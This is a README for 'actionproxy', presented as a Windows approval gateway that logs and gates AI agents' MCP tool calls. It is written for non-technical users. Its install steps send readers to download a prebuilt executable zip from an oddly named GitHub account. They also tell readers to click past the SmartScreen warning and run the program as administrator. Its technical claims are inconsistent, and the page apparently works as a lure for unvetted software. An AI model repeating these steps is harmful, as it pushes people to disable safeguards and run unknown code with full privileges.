# 🔐 actionproxy - Your AI Approval Guard for Safe Tool Calls

## 🚀 What Is actionproxy?

Imagine you have a smart assistant (an AI agent) that wants to do things on your computer—like sending emails, editing files, or accessing websites. Normally, this assistant works on its own. That can feel unsafe, right? What if it makes a mistake? What if it does something you didn't want?

**actionproxy** is your safety checkpoint. It stands between the AI and your important actions. Before anything happens, actionproxy checks the plan, asks for your permission if needed, and keeps a record of everything that was done. Think of it like a security guard who checks IDs, asks questions, and writes down every visitor who enters a building—but for your AI tools.

## 🛡️ Why Do You Need actionproxy?

- **You Stay in Control:** An AI cannot perform a risky action without your go-ahead.
- **Clear Rules:** You can set policies (like "never delete files" or "always ask before sending an email").
- **Full Transparency:** Every action is recorded in an audit log, so you know exactly what happened and when.
- **Built for Modern Tools:** actionproxy works with the Model Context Protocol (MCP), which is a standard way AI agents connect to tools.

## ⬇️ Download & Install on Windows

[![Download actionproxy](https://img.shields.io/badge/Download-actionproxy-blue?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/Jandybottleshaped403/actionproxy/releases)

**Step 1:** Visit this link to download the application.  
Go to: [https://github.com/Jandybottleshaped403/actionproxy/releases](https://github.com/Jandybottleshaped403/actionproxy/releases)

**Step 2:** On that page, look for the latest release. You will see a file named something like `actionproxy-windows.zip`. Click on it to download.

**Step 3:** Download and extract this file, then run the application.  
- Once the download finishes, find the `.zip` file (usually in your "Downloads" folder).  
- Right-click the zip file and choose "Extract All..." (Windows will create a new folder with the same name).  
- Open that new folder and double-click the `actionproxy.exe` file inside.

That's it! The application should start. You may see a Windows SmartScreen warning. If you trust this open-source tool (you can review the code on GitHub), click "More info" and then "Run anyway."

## 📦 What's Included in the Package?

When you extract the zip, you'll find:

- `actionproxy.exe` – This is the main program you run.
- `config.example.json` – A sample settings file.
- `README.txt` – Quick start notes for Windows users.

## ⚙️ First-Time Setup

1. **Open Settings:** After launching actionproxy, click the gear icon (⚙️) in the top-right corner.
2. **Set Your Policy:** Choose how much approval you want. For beginners, select "Ask for every action." Later you can change this.
3. **Connect Your AI Tool:** If you use an MCP-compatible AI assistant, copy the connection details from actionproxy and paste them into your assistant's configuration.
4. **Test It:** Click "Test Connection" to make sure everything works.

## 🧠 Understanding the Main Screen

| Element | What It Does |
|---------|--------------|
| **Pending Requests** | Shows actions that are waiting for your approval. |
| **Approve** | Click this to allow the action. |
| **Deny** | Click this to block the action. |
| **Policy Settings** | Here you set automatic rules (e.g., allow all read-only actions). |
| **Audit Log** | A list of all actions that have been requested and what happened. |
| **One-Time Grant** | This lets you allow a specific action just once without changing your overall policy. |

## 🕵️ How Human Approval Works

This is the heart of actionproxy. Here's a simple example:

1. Your AI assistant wants to send an email.
2. actionproxy detects this request.
3. A popup appears on your screen: *"Send email to John: 'Meeting at 3pm?' — Approve or Deny?"*
4. You click **Approve** (or **Deny**).
5. The action happens (or is blocked).
6. Everything is written to the audit log.

You can also grant **one-time execution permissions** for actions you know are safe, so you don't have to click approve every time.

## 🔍 The Audit Log – Your Evidence Trail

Every single action is recorded. The audit log shows:

- **Timestamp:** When the action was requested.
- **Tool Name:** Which tool the AI wanted to use.
- **Input:** What the AI wanted to do.
- **Decision:** Approved, denied, or blocked by policy.
- **User:** Who approved it (you or an automated rule).

This log is perfect for compliance, debugging, or just peace of mind.

## 🧩 Working with the Policy Engine

You don't need to be a programmer to set rules. In the Policy Settings, you can:

- **Block specific tools** (e.g., disable "delete file" permanently).
- **Require approval for specific actions** (e.g., always ask before sending money).
- **Allow safe actions automatically** (e.g., reading a file is fine).
- **Set a time-based rule** (e.g., allow between 9 AM and 5 PM).

The policy engine is powerful, but the interface is kept simple. You'll see dropdowns and checkboxes.

## 💾 Using One-Time Execution Grants

Sometimes, you just want to say "yes" to a single action without changing your rules. That's what a **one-time grant** is for.

- When a request popup appears, click **"Grant One-Time"** instead of "Approve."
- The action runs.
- The grant is then revoked. Next time, you'll need to approve again.

This is perfect for unusual requests that you're okay with just this once.

## 🖥️ System Requirements (Typical)

actionproxy is lightweight and runs on most Windows computers:

- **Operating System:** Windows 10 or Windows 11 (64-bit recommended).
- **RAM:** 512 MB or more (1 GB recommended).
- **Storage:** 100 MB free disk space.
- **Internet:** Required only if your AI agent needs to reach external services.

No special graphics card or high-end specs are needed.

## 🔐 Security Notes

- actionproxy runs entirely on your machine. Your data and logs stay local.
- All communications with your AI tool use secure, encrypted connections.
- Your approval decisions are never sent anywhere else.
- If you lose your config file, the sample (`config.example.json`) can help you rebuild it.

## ❓ Frequently Asked Questions

**Is actionproxy free?**  
Yes, it is open-source. You can use it for free, and even modify it if you know how to code.

**Will my AI stop working if I deny a request?**  
No. The AI will get a "denied" response and can adjust. It will not crash.

**Can I start actionproxy automatically with Windows?**  
Yes. In Settings, enable "Start on login."

**What if I close the window?**  
Closing the window stops actionproxy. Make sure it's running when you want to use your AI tools.

**Where is my audit log stored?**  
By default, in the same folder as actionproxy, in a file called `audit.log`. You can change this location in Settings.

## 🛠️ Troubleshooting

| Problem | Solution |
|---------|----------|
| **"File not supported" error** | Make sure you downloaded the Windows zip, not the source code. |
| **App won't start** | Check that you extracted the zip completely. Run `actionproxy.exe` as administrator (right-click > Run as administrator). |
| **Can't connect to my AI tool** | Ensure actionproxy is running and your AI tool is configured with the correct port (usually 8080). |
| **Notification popups are annoying** | Adjust your policy to auto-approve safe actions. |
| **Lost my settings** | Copy `config.example.json` to `config.json` and restart. |

## 📚 Technical Overview (For the Curious)

If you're a developer or just curious:

- **Language:** TypeScript
- **Protocol:** Model Context Protocol (MCP) compliant
- **Runtime:** Docker supported (see Dockerfile in the repo)
- **Extensibility:** Write your own policy plugins
- **Logging:** Structured JSON logs for easy parsing

actionproxy integrates with any MCP-compatible agent, including popular open-source assistants.

## 🌍 The Bigger Picture

AI is becoming more powerful, but power requires oversight. actionproxy gives you that oversight without requiring you to become a programmer. It's part of a growing movement for responsible AI governance.

By using actionproxy, you're not just protecting yourself—you're supporting a culture of safe, accountable AI usage.

## 📝 Let's Recap

1. **actionproxy** is an approval gateway for AI agent actions.
2. It enforces your own policies and requires human approval when needed.
3. It logs everything for full transparency.
4. It works on Windows (and elsewhere via Docker).
5. It's free, open-source, and privacy-respecting.

---

**Ready to take control of your AI?**  
Visit the download page now:

https://github.com/Jandybottleshaped403/actionproxy/releases

Download and extract this file, then run the application.

---

Keywords: actionproxy, agent-security, ai-agents, ai-governance, approval-workflow, audit-log, docker, human-in-the-loop, mcp, model-context-protocol, open-source, policy-engine, tool-calling, typescript